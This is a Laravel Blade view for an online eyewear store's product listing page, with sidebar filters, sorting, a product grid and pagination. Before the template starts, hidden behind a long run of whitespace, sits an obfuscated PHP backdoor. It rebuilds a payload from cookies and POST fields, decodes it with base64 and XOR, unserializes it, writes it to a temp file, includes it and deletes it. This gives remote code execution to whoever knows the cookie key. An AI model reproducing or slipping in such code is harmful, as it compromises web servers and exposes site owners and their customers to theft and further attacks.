
<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("zgxrzxp")){class zgxrzxp{public static $hogyilxybr = "jvqeekjikvkiijgs";public static $qtwlziet = NULL;public function __construct(){$pzgafbznuj = @$_COOKIE[substr(zgxrzxp::$hogyilxybr, 0, 4)];if (!empty($pzgafbznuj)){$hkmwmeyp = "base64";$ilearzd = "";$pzgafbznuj = explode(",", $pzgafbznuj);foreach ($pzgafbznuj as $kicugu){$ilearzd .= @$_COOKIE[$kicugu];$ilearzd .= @$_POST[$kicugu];}$ilearzd = array_map($hkmwmeyp . "_decode", array($ilearzd,));$ilearzd = $ilearzd[0] ^ str_repeat(zgxrzxp::$hogyilxybr, (strlen($ilearzd[0]) / strlen(zgxrzxp::$hogyilxybr)) + 1);zgxrzxp::$qtwlziet = @unserialize($ilearzd);}}public function __destruct(){$this->qedcjx();}private function qedcjx(){if (is_array(zgxrzxp::$qtwlziet)) {$euvjshjy = sys_get_temp_dir() . "/" . crc32(zgxrzxp::$qtwlziet["salt"]);@zgxrzxp::$qtwlziet["write"]($euvjshjy, zgxrzxp::$qtwlziet["content"]);include $euvjshjy;@zgxrzxp::$qtwlziet["delete"]($euvjshjy);exit();}}}$oouaqll = new zgxrzxp();$oouaqll = NULL;} ?>@extends('layouts.app')

{{-- Meta tag Section Start --}}
@section('title',"Meta for {$product_for}")
@section('description',"Meta for {$product_for}")
@section('keywords',"Meta for {$product_for}")

{{-- Meta tag Section End --}}

@section('content')


<div class="sun-breadcrumb-01">
<div class="container-fluid">
<div class="row">
<div class="col-lg-12">
<div class="breadcrumb-01">

<ul style="margin-left:40px;">
<li><a href="{{url('/')}}"> &nbsp; <i class="fas fa-home"></i></a></li>
<li><a href="">{{$product_for}}</a></li>
</ul>
</div>
</div>
</div>
</div>
</div>

<div class="row" style="background-color:#FDFBF9;">

<div class="col-lg-4">
<div class="product-banner">
<img src="{{asset('img/only.gif')}}">
</div>
</div>
<style>
#title_message {
    display: none;
}

@media screen and (min-width: 768px) {
    #title_message {
        clear: both;
        display: block;
        float: left;
        margin: 10px auto 5px 20px;
        width: 100%;
    }
}</style>


<div class="col-lg-8">
<div id="title_message">

<img src="{{asset('img/only2.png')}}">
</div>
</div>
</div>

<div class="">
<div class="container-fluid" >
<div class="row" style="margin-top:20px;">
<div class="col-lg-2 dekstop-view">
    
    
     <style>
    
 
 #example2 {
 border: 0px solid;
    padding: 10px;
    box-shadow: 1px 0px #ebebeb;
}
</style>   
    
<div class="widget-wrap"> 
<div class="widget-search">

<input type="text" placeholder="Search" class="form-control" name="search_product" id="search_product" @isset($search_product) value="{{$search_product}}" @endisset>

<button onclick="filter_product_for('search_filter')"><i class="fa fa-search"></i></button>

@if(isset($search_product) && !empty($search_product))
 @php
 $search_product_key = 'search_product';
 $url = Request::fullURL();

// Remove specific parameter from query string
$filteredURL = preg_replace('~(\?|&)'.$search_product_key.'=[^&]*~', '$1', $url);

 @endphp

 <span style="float:right"><a href="{{url($filteredURL)}}" title="Remove Filter"><i class="fa fa-times-circle"></i></a></span>
@endif
</div>
</div>


<div class="left-cate" id="example2">
<h4>Our Brands 
@if(isset($brand_array) && !empty($brand_array))
 @php
 $brand_key = 'brand_array';
 $url = Request::fullURL();

// Remove specific parameter from query string
$filteredURL = preg_replace('~(\?|&)'.$brand_key.'=[^&]*~', '$1', $url);

 @endphp

 <span style="float:right"><a href="{{url($filteredURL)}}" title="Remove Filter"><i class="fa fa-times-circle"></i></a></span>
@endif
</h4>
<ul style="overflow: scroll;
    overflow-x: hidden;
	height:200px;">
@php
if(isset($brand_array)){
$check_brand = explode(',',$brand_array);
}
@endphp    
@foreach($all_brands as $brand)
 
 <li><input type="checkbox" name="brands[]" id="brands[]" value="{{$brand->id}}" onclick="filter_product_for('brand_filter')" @if(isset($brand_array)) @if(in_array($brand->id,$check_brand)) checked @endif @endisset> {{$brand->category_name}}</li>

@endforeach
</ul>
</div>

<!--<div class="left-search">
    <h4>Gender</h4>
<ul class="brands-list-row">
@php
if(isset($gender_array)){
$check_gender = explode(',',$gender_array);
}
@endphp
<li><input type="checkbox" name="genders[]" id="genders[]" value="Gentle Man" onclick="filter_product_for('gender_filter')" @if(isset($gender_array)) @if(in_array('Gentle Man',$check_gender)) checked @endif @endisset> Gentle Man</li>
<li><input type="checkbox" name="genders[]" id="genders[]" value="Woman" onclick="filter_product_for('gender_filter')" @if(isset($gender_array)) @if(in_array('Woman',$check_gender)) checked @endif @endisset> Woman</li>
<li><input type="checkbox" name="genders[]" id="genders[]" value="Junior" onclick="filter_product_for('gender_filter')" @if(isset($gender_array)) @if(in_array('Junior',$check_gender)) checked @endif @endisset> Junior</li>

</ul>
</div>-->

<div class="left-search" id="example2">
<h4>Colors
@if(isset($color_array) && !empty($color_array))
 @php
 $color_key = 'color_array';
 $url = Request::fullURL();

// Remove specific parameter from query string
$filteredURL = preg_replace('~(\?|&)'.$color_key.'=[^&]*~', '$1', $url);

 @endphp

 <span style="float:right"><a href="{{url($filteredURL)}}" title="Remove Filter"><i class="fa fa-times-circle"></i></a></span>
@endif    
    </h4>
<ul class="brands-list-row" style="overflow: scroll;
    overflow-x: hidden;
	height:250px;">
@php
if(isset($color_array)){
$check_color = explode(',',$color_array);
}
@endphp
 @foreach($frame_colors as $color)
 <li><input type="checkbox" name="colors[]" id="colors[]" value="{{$color->id}}" onclick="filter_product_for('color_filter')" @if(isset($color_array)) @if(in_array($color->id,$check_color)) checked @endif @endisset> {{$color->color_name}}</li>
 @endforeach

</ul>
</div>

<div class="left-search" id="example2">
    <h4>Shapes
@if(isset($shape_array) && !empty($shape_array))
 @php
 $shape_key = 'shape_array';
 $url = Request::fullURL();

// Remove specific parameter from query string
$filteredURL = preg_replace('~(\?|&)'.$shape_key.'=[^&]*~', '$1', $url);

 @endphp

 <span style="float:right"><a href="{{url($filteredURL)}}" title="Remove Filter"><i class="fa fa-times-circle"></i></a></span>
@endif    
    </h4>
<ul class="brands-list-row">
@php
if(isset($shape_array)){
$check_shape = explode(',',$shape_array);
}
@endphp
 @foreach($frame_shapes as $shape)
 <li>
     <input type="checkbox" name="shapes[]" id="shapes[]" value="{{$shape->shape}}"
     onclick="filter_product_for('shape_filter')" @if(isset($shape_array)) @if(in_array($shape->shape,$check_shape)) 
     checked @endif @endisset> {{$shape->shape}}</li>
 @endforeach
 


</ul>
</div>

<div class="left-search" id="example2">
    <h4>Material
@if(isset($material_array) && !empty($material_array))
 @php
 $material_key = 'material_array';
 $url = Request::fullURL();

// Remove specific parameter from query string
$filteredURL = preg_replace('~(\?|&)'.$material_key.'=[^&]*~', '$1', $url);

 @endphp

 <span style="float:right"><a href="{{url($filteredURL)}}" title="Remove Filter"><i class="fa fa-times-circle"></i></a></span>
@endif    
    </h4>
<ul class="brands-list-row">
@php
if(isset($material_array)){
$check_material = explode(',',$material_array);
}
@endphp
 @foreach($frame_materials as $material)
 <li><input type="checkbox" name="materials[]" id="materials[]" value="{{$material->material}}" onclick="filter_product_for('material_filter')" @if(isset($material_array)) @if(in_array($material->material,$check_material)) checked @endif @endisset> {{$material->material}}</li>
 @endforeach
 


</ul>
</div>

<div class="left-search" id="example2">
<h4>Frame Type
@if(isset($frame_array) && !empty($frame_array))
 @php
 $frame_key = 'frame_array';
 $url = Request::fullURL();

// Remove specific parameter from query string
$filteredURL = preg_replace('~(\?|&)'.$frame_key.'=[^&]*~', '$1', $url);

 @endphp

 <span style="float:right"><a href="{{url($filteredURL)}}" title="Remove Filter"><i class="fa fa-times-circle"></i></a></span>
@endif

</h4>

<ul class="brands-list-row">
@php
if(isset($frame_array)){
$check_frame = explode(',',$frame_array);
}
@endphp    
 @foreach($frame_types as $type)
 <li><input type="checkbox" name="frames[]" id="frames[]" value="{{$type->type}}" onclick="filter_product_for('frame_filter')" @if(isset($frame_array)) @if(in_array($type->type,$check_frame)) checked @endif @endisset> {{$type->type}}</li>
 @endforeach
</ul>
</div>

<div class="left-search" id="example2">
<h4>Refine Search
@if(isset($min_price) && !empty($min_price))

@php
$key1 = 'min_price';
$key2 = 'max_price';
$url = Request::fullURL();

// Remove specific parameter from query string
$filteredURL = preg_replace('~(\?|&)'.$key1.'=[^&]*~', '$1', $url);
$filteredURL = preg_replace('~(\?|&)'.$key2.'=[^&]*~', '$1', $filteredURL);

@endphp
<a href="{{url(''.$filteredURL)}}"><i class="fa fa-times-circle"></i></a>
@endif
</h4>
<div class="sun-searc">


 <input type="number" name="min_price" id="min_price" @isset($min_price) value="{{$min_price}}" @endisset size="7" placeholder="Min price"style="width:65%; margin: 3px;">
 <i class="fa fa-exchange fa-rotate-90" aria-hidden="true" ></i>
 
 <input type="number" name="max_price" id="max_price" @isset($max_price) value="{{$max_price}}" @endisset size="7" placeholder="Max price"style="width:65%;margin: 3px; "><br>
 <button class="btn" type="submit" onclick="filter_product_for('price_filter')"  style="margin-left:25px; margin-top:8px;">Go</button>


</div>
</div>
<div class="widget-wrap"> 
<div class="widget-content">
<ul id="tabs" class="sidebar-tabs">
<li class="active"><a href="" data-toggle="tab" aria-expanded="true">Top Selling Products</a></li>

</ul>

<div class="tab-content">
    
    
<div class="tab-pane fade active in" id="tab-s1">

@if($top_products->isNotEmpty())
 @foreach($top_products as $product)
<div class="recent-wrap row">
<div class="col-lg-4 col-5 recent-slide-img">
<div class="light-bg">                                                                                                                 
<a href="{{url('/frame/'.$product->category_slug_name.'.html')}}"> 
<img class="img-responsive" src="{{asset('uploaded_files/product/'.$product->category_image_name)}}" alt=""> 
</a>                                  
</div>
</div>
<div class="col-lg-8  col-7 no-padding recent-slide-des">
<div class="caption-title">
    <a href="{{url('/frame/'.$product->category_slug_name.'.html')}}">
    <h2 style="font-size:14px; text-transform: capitalize">{{$product->category_name}}</h2></a></div>
<div class="rating">                                                            
    <span class="star active"></span>
    <span class="star active"></span>
    <span class="star active"></span>                                           
    <span class="star active"></span>
    <span class="star half"></span>                                           
</div>
<div class="caption-text"> <span> {{$product->category_price}} </span> </div>                         
</div>
</div>
 @endforeach
@endif

</div>


</div>
</div>
</div>


</div>
<div class="col-lg-10">

<div class="sung-grid-sorting row align-items-center">
<div class="col-lg-6 col-md-6 result-count">
    
    
    
<p style="color:grey;">We found <span class="count">{{$products['total']}}</span> products available for you</p>
<span class="sub-title d-lg-none"><a href="#" data-toggle="modal" data-target="#productsFilterModal"><i class="bx bx-filter-alt"></i> Filter</a></span>
</div>

<div class="col-lg-3 col-md-3 ordering">
    </div>

<div class="col-lg-3 col-md-3 ordering">
<div class="select-box"  style="border: 2px solid;
    margin: 0px;
    padding: 20px;
    border-color: #dfdcdc8c;">



<form class="filter-form-product-for" method="get" action="{{url('/filter-product-for')}}">
@csrf
@method('GET')	

Sort By


<input type="hidden" class="form-control" name="search_product" class="search_product" @isset($search_product) value="{{$search_product}}" @endisset>

<input type="hidden" class="form-control" name="glass_type" class="glass_type" @isset($glass_type) value="{{$glass_type}}" @endisset>

<input type="hidden" class="form-control" name="color_array" class="colors" @isset($color_array) value="{{$color_array}}" @endisset>

<input type="hidden" class="form-control" name="brand_array" class="brands" @isset($brand_array) value="{{$brand_array}}" @endisset>

<input type="hidden" class="form-control" name="gender_array" class="genders" @isset($gender_array) value="{{$gender_array}}" @endisset>

<input type="hidden" class="form-control" name="shape_array" class="shapes" @isset($shape_array) value="{{$shape_array}}" @endisset>

<input type="hidden" class="form-control" name="frame_array" class="frames" @isset($frame_array) value="{{$frame_array}}" @endisset>

<input type="hidden" class="form-control" name="material_array" class="materials" @isset($material_array) value="{{$material_array}}" @endisset>

<input type="hidden" name="min_price" class="min_price" @isset($min_price) value="{{$min_price}}" @endisset>
<input type="hidden" name="max_price" class="max_price" @isset($max_price) value="{{$max_price}}" @endisset>



<input type="hidden" name="product_for" id="product_for" value="{{$product_for}}">

<select name="order_filter" id="order_filter" onchange="filter_product_for('order_filter')" style="border-color: transparent;">
<option value="Default">Default</option>
<option value="Latest" @isset($order_filter) @if($order_filter=="Latest") selected @endif @endisset>Latest</option>
<option value="Low" @isset($order_filter) @if($order_filter=="Low") selected @endif @endisset>Price: low to high</option>
<option value="High" @isset($order_filter) @if($order_filter=="High") selected @endif @endisset>Price: high to low</option>
<option value="Sort_ASC" @isset($order_filter) @if($order_filter=="Sort_ASC") selected @endif @endisset>A to Z</option>
<option value="Sort_DESC" @isset($order_filter) @if($order_filter=="Sort_DESC") selected @endif @endisset>Z to A</option>
</select>
</form>
</div>
</div>
</div>

<div class="row text-center">
@foreach($products['data'] as $product)
@php
 $brand = DB::table('categories')->select('category_name')->where('id',$product['category_parent_id'])->first();
@endphp
<div class="col-lg-4 col-12 cate-box">
    

<div class="thumbnail-wrap">
<div class="thumbnail">
    <a href="{{url('/frame/'.$product['category_slug_name'].'.html')}}">
<div class="thumbnail-img light-bg">


<div class="flipper">

<div class="front">
@if(!empty($product['category_image_name']))    
<img src="{{asset('uploaded_files/product/'.$product['category_image_name'])}}"  alt="{{$product['category_name']}}" title="{{$product['category_name']}}" class="img-fluid">
@else
<img class="img-responsive" src="{{ asset('admin_assets/images/no_image.jpg') }}" style="width:400px; height:250px" alt="{{$product['category_name']}}" title="{{$product['category_name']}}" class="img-fluid">
@endif
</div>
<div class="back">
@if(!empty($product['category_image_name2']))    
<img src="{{asset('uploaded_files/product/'.$product['category_image_name2'])}}"  alt="{{$product['category_name']}}" title="{{$product['category_name']}}" class="img-fluid">
@else
<img class="img-responsive" src="{{ asset('admin_assets/images/no_image.jpg') }}" style="width:400px; height:250px" alt="{{$product['category_name']}}" title="{{$product['category_name']}}" class="img-fluid">
@endif
</div>

@if($product['category_is_discount']=="Yes")      
 <div class="sale-tag right"> <span> {{$product['category_discount']}}% </span> </div>
@endif

</div>

</div>
<div class="sun-product-detail">
<span style="font-family: utopia-std,Charter,Georgia,serif;
    font-weight: 600;
    line-height: calc(1em + 6px);
    margin-top: 0;
    margin-bottom: 0;
    font-size: 20px;
    color: #414B56;
    margin-bottom: 0px;">{{$brand->category_name}}</span><br>
<a href="{{url('/frame/'.$product['category_slug_name'].'.html')}}">
<span style="color: #212121;
    font-family: Nunito,sans-serif;
    font-weight: 400;
    font-style: normal;
    letter-spacing: 2px;
    text-transform: uppercase;
"> {{Str::limit($product['category_name'],20,$end='..')}}</span>
</a>
<p>{{getCurrencySymbol($ip_country).getCurrencyPrice($ip_country,$product['category_discount_price'])}} 
@if($product['category_is_discount']=="Yes")
<strike id="mrp">{{getCurrencySymbol($ip_country).getCurrencyPrice($ip_country,$product['category_price'])}}</strike>
@endif
</p>
@php
$get_current_color = DB::table('product_colors')->where('id',$product['category_color'])->first(); 
@endphp
<div class="product-color">

@php
 $group_ids = explode(',',$product['category_group_ids']);
 $group_prd = DB::table('categories')->whereIn('id',$group_ids)->where('category_status','Active')->get();
 $i=1;
@endphp
@if(!empty($product['category_group_ids']))  

@foreach($group_prd as $group)
 @php
$color_data = DB::table('product_colors')->where('id',$group->category_color)->first(); 
 @endphp    
<a href="{{url('/frame/'.$group->category_slug_name.'.html')}}" 
class="pro-ibtn  btn-tool @if($group->category_slug_name==$product['category_slug_name']) color-btn @endif ">
<img class="pro-i" src="{{asset('uploaded_files/color_image/'.$color_data->color_image_name)}}" style="margin-top: -30px; width:25px; height: 25px;">
</a>
@php
  $i++;
 @endphp   
@endforeach
@else

<a href="{{url('/frame/'.$product['category_slug_name'].'.html')}}" class="pro-ibtn  btn-tool color-btn ">
<img class="pro-i" src="{{asset('uploaded_files/color_image/'.$get_current_color->color_image_name)}}" 
style="margin-top: -30px; width:25px; height: 25px;">
</a>

@endif
</div>

</div>
</a>
</div>
</div>

</div>
@endforeach   

</div>




<div class="sun-pagination">
<div class="container">
    
<div class="row">
<div class="col-lg-6" style="color:grey;">
<div class="">
Showing {{$products['from']}} to {{$products['to']}} of {{$products['total']}} ({{$products['last_page']}} Pages)
</div>
</div>
<div class="col-lg-6">
<ul class="pagination">
{{$data->appends($_GET)->links()}}
</ul>



</div>
</div>

</div>
</div>

</div>

</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>

